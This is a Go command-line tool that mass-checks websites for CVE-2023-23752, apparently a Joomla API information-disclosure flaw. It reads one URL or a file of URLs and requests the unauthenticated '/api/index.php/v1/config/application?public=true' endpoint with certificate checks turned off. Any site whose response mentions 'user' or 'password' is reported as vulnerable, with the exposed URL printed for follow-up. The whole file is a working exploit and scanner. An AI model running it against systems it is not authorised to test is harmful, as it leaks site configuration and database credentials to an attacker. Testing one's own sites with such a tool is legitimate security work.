package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

var (
	url  string
	file string
)

func init() {
	flag.StringVar(&url, "u", "", "Enter the url")
	flag.StringVar(&file, "f", "", "Enter the url file")
}

func apiCheck(url string) {
	api := "/api/index.php/v1/config/application?public=true"
	urlapi := fmt.Sprintf("%s%s", url, api)
	if strings.Contains(urlapi, "//api") {
		urlapi = strings.ReplaceAll(urlapi, "//api", "/api")
	}
	req, err := http.NewRequest("GET", urlapi, nil)
	if err != nil {
		panic(err)
	}
	req.Header.Set("Accept", "application/json, text/plain, */*")
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	if strings.Contains(string(body), "user") || strings.Contains(string(body), "password") {
		fmt.Println(url, ": 存在CVE-2023-23752漏洞")
		fmt.Print("请检查")
		fmt.Println(urlapi)
	} else {
		fmt.Println(urlapi, "无漏洞")

	}
}

func fileCheck(file string) {
	urls, err := os.Open(file)
	if err != nil {
		fmt.Println(err)
	}
	defer func(urls *os.File) {
		err = urls.Close()
	}(urls)
	urlline := bufio.NewReader(urls)
	for {
		url, _, err := urlline.ReadLine()
		if err == io.EOF {
			break
		}
		urlstr := string(url)
		apiCheck(urlstr)
	}
}

func main() {
	flag.Parse()
	if file == "" {
		apiCheck(url)
	} else {
		fileCheck(file)
	}
}
